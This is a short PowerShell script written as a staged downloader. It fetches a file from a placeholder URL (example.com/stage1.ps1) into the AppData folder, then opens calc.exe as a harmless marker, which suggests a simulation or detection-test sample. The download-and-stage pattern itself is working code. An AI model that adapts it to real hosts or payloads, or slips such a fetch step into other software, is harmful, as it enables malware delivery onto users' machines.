[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://example.com/stage1.ps1",
    [string]$WorkingPath = "$env:APPDATA\stage2.bin",
    [int]$RequestTimeout = 154
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Invoke-StageDownload -SourceUrl $RemoteUrl -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Verbose "stage marker 42 reached"
Write-Output "stage 2 initialized"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
